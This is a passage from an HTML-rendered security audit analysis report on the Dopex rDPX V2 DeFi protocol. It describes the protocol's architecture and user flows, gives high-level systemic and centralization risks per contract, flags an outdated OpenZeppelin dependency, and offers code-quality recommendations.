ReLPContract:</h3>\n<p><img src=\"https://user-images.githubusercontent.com/131902879/282843418-0ee998e9-811c-4673-a542-1ee22b718053.png\" alt=\"Dopex10reLP\"></p>\n<h3 id=\"whats-unique-whats-using-existing-patterns\" style=\"position:relative;\"><a href=\"#whats-unique-whats-using-existing-patterns\" aria-label=\"whats unique whats using existing patterns permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>What’s unique? What’s using existing patterns?</h3>\n<ul>\n<li>\n<p><strong>Unique Features</strong>:</p>\n<ul>\n<li><em>Decaying Bonds</em>: Issuance of <code>ERC721</code> decaying bonds offering rebates and indirect <code>rDPX</code> emission.</li>\n</ul>\n</li>\n<li>\n<p><strong>Utilization of Existing Patterns</strong>:</p>\n<ul>\n<li><em>Token Standards</em>: <code>ERC721</code> and <code>ERC20</code> token standards for bonds, <code>LP tokens</code>, and assets.</li>\n<li><em>Liquidity Pools and AMOs</em>: Utilizing <code>Uniswap V2</code> and <code>V3 functions</code> for liquidity and <code>AMO</code> operations.</li>\n<li><em>Staking and Rewards</em>: Implementing staking and proportional rewards mechanisms.</li>\n<li><em>Oracle Integration</em>: Using oracles for accurate price information.</li>\n<li><em>Access Control</em>: <code>Role-based</code> access control for secure interactions.</li>\n<li><em>Strategy Contracts</em>: Automating liquidity provision with strategy contracts.</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"3--architecture-of-the-rdpx-v2\" style=\"position:relative;\"><a href=\"#3--architecture-of-the-rdpx-v2\" aria-label=\"3  architecture of the rdpx v2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>3- Architecture of the rDPX V2</h2>\n<p>This diagram illustrates how the different contracts and modules interact within the <code>rDPX V2</code> ecosystem.</p>\n<p><img src=\"https://user-images.githubusercontent.com/131902879/282843565-9aa03baa-35d7-423d-98a9-4726f3a6a014.png\" alt=\"Dopex6Arqui\"></p>\n<ul>\n<li>\n<p><strong>How a user interacts</strong> 🧑‍💻:\nUsers interact with the <code>rDPX V2</code> through their actions, such as:</p>\n<ul>\n<li><strong><code>Bonding and Interaction with Core Modules</code></strong>:</li>\n<li>A user can initiate bonding processes through the Bonding Module. They can acquire <code>rDPX</code> Bond tokens, which represent their bond balance.</li>\n<li>The user can interact with the Peg Stability module indirectly by participating in bonding processes. The module aims to maintain the peg of <code>dpxETH</code>.</li>\n<li>Users can engage with the Backing Reserves module by providing reserves (such as <code>rDPX</code> or <code>ETH</code>) to be used by Automated Market Operators (AMOs)..</li>\n<li><strong><code>Liquidity Provision and Yield Generation</code></strong>:</li>\n<li>Users can provide liquidity to the <code>AtlanticPerpetualPoolLP</code>, contributing to the liquidity of the <code>AtlanticPerpetualPool</code>.</li>\n<li>By adding liquidity, users earn rewards which they can stake in the <code>AtlanticPerpetualPoolStaking</code> contract for further yield.</li>\n<li><strong><code>Option Trading</code></strong>:</li>\n<li>Users can mint option tokens (NFTs) by interacting with the <code>AtlanticPerpetualPool</code> contract.</li>\n<li>These option tokens can be traded or used for various purposes within the ecosystem.</li>\n<li><strong><code>Decaying Bonds and Loss Mitigation</code></strong>:</li>\n<li>If a user experiences losses from Dopex Option Products, they might receive decaying bonds from the rDPX Decaying Bonds contract. These bonds act as a rebate for their losses.</li>\n<li><strong><code>Staking and Yield Farming</code></strong>:</li>\n<li>Users can stake <code>RdpxV2ReceiptToken</code> in the <code>RdpxV2ReceiptTokenStaking</code> contract to earn boosted yields from the <code>Curve LP</code> and <code>DPX incentives</code>.</li>\n<li><strong><code>Utilizing Oracles</code></strong>:</li>\n<li>Users can access real-time price information from the <code>dpxETH/ETH</code> Oracle and <code>rDPX/ETH</code> Oracle to make informed decisions.</li>\n<li><strong><code>AMO Interaction</code></strong>:</li>\n<li>If users wish to use <code>Uniswap V2</code> or <code>V3 functions</code>, they can do so through the respective <code>AMO</code> contracts. This involves actions like <code>adding</code> or <code>removing</code> liquidity and <code>making swaps</code>.</li>\n<li><strong><code>Redeeming Rewards and Tokens</code></strong>:</li>\n<li>Users can redeem rewards earned from staking, providing liquidity, or participating in other activities within the ecosystem.</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"4--documents\" style=\"position:relative;\"><a href=\"#4--documents\" aria-label=\"4  documents permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>4- Documents</h2>\n<ul>\n<li>The documentation of the <code>Dopex rDPX V2</code> project is quite comprehensive and detailed, providing a solid overview of how <code>rDPX V2</code> is structured and how its various aspects function. However, we have noticed that there is room for additional details, such as <code>diagrams</code>, to gain a deeper understanding of how different contracts interact and the functions they implement. With considerable enthusiasm, we have dedicated several days to creating diagrams for each of the contracts.\nWe are confident that these diagrams will bring significant value to the protocol as they can be seamlessly integrated into the existing <code>documentation</code>, enriching it and providing a more comprehensive and detailed understanding for <code>users</code>, <code>developers</code> and <code>auditors</code>.</li>\n<li>We suggest including high-quality articles on <code>Medium</code>, as it’s an excellent way to provide an in-depth understanding of many project topics, and it’s a common practice in many blockchain projects.</li>\n</ul>\n<h2 id=\"5--systemic--centralization-risks\" style=\"position:relative;\"><a href=\"#5--systemic--centralization-risks\" aria-label=\"5  systemic  centralization risks permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>5- Systemic &#x26; Centralization Risks</h2>\n<p>Here’s an analysis of potential systemic and centralization risks in the provided contracts:</p>\n<h3 id=\"univ2liquidityamo\" style=\"position:relative;\"><a href=\"#univ2liquidityamo\" aria-label=\"univ2liquidityamo permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>UniV2LiquidityAmo:</h3>\n<ul>\n<li>\n<p><strong>Systemic Risks</strong>:</p>\n<ul>\n<li>Calculation errors in exchange and liquidity operations.</li>\n<li>Authorization mistakes and manipulation vulnerabilities.</li>\n<li>Errors in swaps and reliance on price oracles.</li>\n</ul>\n</li>\n<li>\n<p><strong>Centralization Risks</strong>:</p>\n<ul>\n<li>Dependency on external contracts and administrator control.</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"univ3liquidityamo\" style=\"position:relative;\"><a href=\"#univ3liquidityamo\" aria-label=\"univ3liquidityamo permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>UniV3LiquidityAmo:</h3>\n<ul>\n<li>\n<p><strong>Systemic Risks</strong>:</p>\n<ul>\n<li>Calculation errors and oracle dependency.</li>\n<li>Unintended position changes due to mistakes.</li>\n</ul>\n</li>\n<li>\n<p><strong>Centralization Risks</strong>:</p>\n<ul>\n<li>Administrator control and reliance on external contracts.</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"rdpxv2core\" style=\"position:relative;\"><a href=\"#rdpxv2core\" aria-label=\"rdpxv2core permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>RdpxV2Core:</h3>\n<ul>\n<li>\n<p><strong>Systemic Risks</strong>:</p>\n<ul>\n<li>Centralized control and oracle dependence (The oracle is out the scope in this audit, but we recommend to consider auditing and make code reviews in those contracts).</li>\n<li>Delegation mechanism and <code>AMO</code> dependency.</li>\n</ul>\n</li>\n<li>\n<p><strong>Centralization Risks</strong>:</p>\n<ul>\n<li>Administrator control over <code>pause</code> and <code>withdrawal</code>.</li>\n<li>Minting control and reliance on external contracts.</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"rdpxv2bond\" style=\"position:relative;\"><a href=\"#rdpxv2bond\" aria-label=\"rdpxv2bond permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>RdpxV2Bond:</h3>\n<p><strong>Centralization Risks</strong>:</p>\n<ul>\n<li>Minting control and <code>bond</code> amount.</li>\n<li><code>Ownership</code> and contract governance.</li>\n</ul>\n<h3 id=\"rdpxdecayingbonds\" style=\"position:relative;\"><a href=\"#rdpxdecayingbonds\" aria-label=\"rdpxdecayingbonds permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>RdpxDecayingBonds:</h3>\n<ul>\n<li>\n<p><strong>Systemic Risks</strong>:</p>\n<ul>\n<li>Vulnerability in <code>emergencyWithdraw()</code> function could lead to fund loss during emergencies.</li>\n<li>Improper implementation or malicious exploitation of <code>pausing</code> could disrupt contract functionality.</li>\n<li>Interaction with external contracts introduces security and behavior risks.</li>\n<li>Lack of mechanisms to limit bond supply may cause unintended inflation.</li>\n</ul>\n</li>\n</ul>\n<p><strong>Centralization Risks</strong>:</p>\n<ul>\n<li>Admin’s control over pausing and withdrawal might centralize power.</li>\n<li>Concentrated <code>MINTER_ROLE</code> control could lead to centralized <code>bond</code> issuance.</li>\n<li>Centralized <code>RDPXV2CORE_ROLE</code> control might impact <code>bond</code> adjustments.</li>\n<li>Absence of governance could centralize <code>upgrade</code> decisions.</li>\n<li>Initial <code>deployer's role ownership</code> could centralize contract control.</li>\n</ul>\n<h3 id=\"dpxethtoken\" style=\"position:relative;\"><a href=\"#dpxethtoken\" aria-label=\"dpxethtoken permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>DpxEthToken:</h3>\n<ul>\n<li>\n<p><strong>Systemic Risks</strong>:</p>\n<ul>\n<li>Lack of burn limits and reliance on external contracts.</li>\n</ul>\n</li>\n<li>\n<p><strong>Centralization Risks</strong>:</p>\n<ul>\n<li>Administrator control and centralized role assignment.</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"perpetualatlanticvault\" style=\"position:relative;\"><a href=\"#perpetualatlanticvault\" aria-label=\"perpetualatlanticvault permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>PerpetualAtlanticVault:</h3>\n<ul>\n<li>\n<p><strong>Systemic Risks</strong>:</p>\n<ul>\n<li>Funding calculation errors and stale data.</li>\n<li>External contract dependencies and reentrancy.</li>\n</ul>\n</li>\n<li>\n<p><strong>Centralization Risks</strong>:</p>\n<ul>\n<li><code>Manager role</code> control and <code>administrator</code> authority.</li>\n<li><code>Whitelist</code> control and contract upgrades.</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"perpetualatlanticvaultlp\" style=\"position:relative;\"><a href=\"#perpetualatlanticvaultlp\" aria-label=\"perpetualatlanticvaultlp permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>PerpetualAtlanticVaultLP:</h3>\n<ul>\n<li>\n<p><strong>Systemic and Centralization Risks</strong>:</p>\n<ul>\n<li>Centralized control due to dependency on <code>perpetualAtlanticVault</code> contract.</li>\n<li>Vulnerabilities in external contracts and <code>liquidity</code> risk.</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"relpcontract\" style=\"position:relative;\"><a href=\"#relpcontract\" aria-label=\"relpcontract permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ReLPContract:</h3>\n<ul>\n<li>\n<p><strong>Systemic Risks</strong>:</p>\n<ul>\n<li><code>Slippage</code> tolerance risk and <code>role</code> centralization.</li>\n</ul>\n</li>\n<li>\n<p><strong>Centralization Risks</strong>:</p>\n<ul>\n<li>Administrator control and dependence on external contracts.</li>\n</ul>\n</li>\n</ul>\n<p>These summaries outline the major risks that each contract is exposed to in relation to potential <code>system-wide</code> problems and <code>concentration of control</code>.</p>\n<h3 id=\"dependency-risk\" style=\"position:relative;\"><a href=\"#dependency-risk\" aria-label=\"dependency risk permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><strong>Dependency risk</strong>:</h3>\n<ul>\n<li>We observed that old and unsafe versions of Openzeppelin are used in the project, this should be updated to the latest one:</li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"159\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">package</span><span class=\"mtk1\">.</span><span class=\"mtk12\">json</span><span class=\"mtk1\">#</span><span class=\"mtk12\">L4</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk7\">4</span><span class=\"mtk1\">: </span><span class=\"mtk8\">&quot;version&quot;</span><span class=\"mtk1\">: </span><span class=\"mtk8\">&quot;4.9.0&quot;</span><span class=\"mtk1\">,</span></span></span></code></pre>\n<ul>\n<li>Latest is <code>4.9.3</code> (as of July 28, 2023), version used in project is <code>4.9.0</code></li>\n<li>You can read more of this issue in our <code>QA</code>.</li>\n</ul>\n<h2 id=\"6--new-insights-and-learning-from-this-audit\" style=\"position:relative;\"><a href=\"#6--new-insights-and-learning-from-this-audit\" aria-label=\"6  new insights and learning from this audit permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>6- New insights and learning from this audit</h2>\n<p>Our new insights from this <code>Dopex rDPX V2</code> protocol audit have been exponential. We have learned about the intricate <code>bonding mechanisms</code>, including <code>regular</code>, <code>delegate</code>, and <code>decaying bonds</code>, which cater to various scenarios but require user understanding. Inspired by <code>Frax Finance</code>, Algorithmic Market Operations <code>AMOs</code> are integrated to mitigate risks. The addition of <code>perpetual options</code> and increased <code>yield</code> issuance for <code>receipt token</code> holders aims to incentivize participation. Governance-controlled parameters ensure adaptability, but effective governance is essential. The <code>fee</code> structure of the <code>redemption mechanism</code> impacts liquidity. The implementation strategy emphasizes initial liquidity and participation.</p>\n<h2 id=\"7--test-analysis\" style=\"position:relative;\"><a href=\"#7--test-analysis\" aria-label=\"7  test analysis permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>7- Test analysis</h2>\n<p>The audit scope of the contracts to be reviewed is 95%, with the aim of reaching 100%. However, the tests provided by the protocol are at a high level of comprehension, giving us the opportunity to easily conduct Proof of Concepts <code>(PoCs)</code> to test certain bugs present in the project.</p>\n<h3 id=\"how-could-they-have-improved\" style=\"position:relative;\"><a href=\"#how-could-they-have-improved\" aria-label=\"how could they have improved permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>How Could They Have Improved?</h3>\n<p>While the provided codes seems to be functional, there are always areas for improvement to ensure better security, efficiency, and readability in both the contracts and the protocol.</p>\n<ul>\n<li>\n<p>Here are some potential areas for improvement:</p>\n<ol>\n<li><strong>Modularization and Separation of Concerns</strong>:</li>\n<li>\n<p>The contract <code>RdpxV2Core</code> code is lengthy and contains many functions in a single unit. Consider separating different responsibilities into smaller, specific modules.\nFor example, you can create modules for:</p>\n<ul>\n<li>Bond handling</li>\n<li>Delegate interaction</li>\n<li>Price calculations etc.</li>\n</ul>\n</li>\n</ol>\n<p> This will improve code readability and maintainability.</p>\n<ol start=\"2\">\n<li><strong>Comments and Detailed Documentation</strong>:</li>\n<li>While the code has comments, certain sections may necessitate more comprehensive explanations, such as the <code>Execute</code> function in the <code>UniV3LiquidityAmo.sol</code> contract.</li>\n</ol>\n<p> It is recommended to document it as per the instructions provided by the sponsor in the Discord DM:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"shell\" data-index=\"160\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">psytama — 22/08/2023 21:18</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    - &quot;We just added a generic proxy function in case an unforeseeable situation arises; we would utilize it&quot;</span></span></code></pre>\n<p> Enhance the clarity and comprehensibility of the code by incorporating explicit and elucidative comments for every function and segment. This practice will not only enhance understanding but also facilitate seamless maintenance.</p>\n<ol start=\"3\">\n<li><strong>Structured Comments</strong>:</li>\n<li>Use structured comments, such as standardized function headers (NATS), to describe the function, its parameters, returns, and behavior. This will make the code more understandable for other developers.</li>\n</ol>\n</li>\n</ul>\n<h2 id=\"conclusion-2\" style=\"position:relative;\"><a href=\"#conclusion-2\" aria-label=\"conclusion 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Conclusion</h2>\n<p>In general, the <code>Dopex rDPX V2 project</code> exhibits an interesting and well-developed architecture we believe the team has done a good job regarding the code, but the identified risks need to be addressed, and measures should be implemented to protect the protocol from potential malicious use cases. It is also highly recommended that the team continues to invest in security measures such as mitigation reviews, audits, and bug bounty programs to maintain the security and reliability of the project.</p>\n<h3 id=\"time-spent-\" style=\"position:relative;\"><a href=\"#time-spent-\" aria-label=\"time spent  permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Time Spent 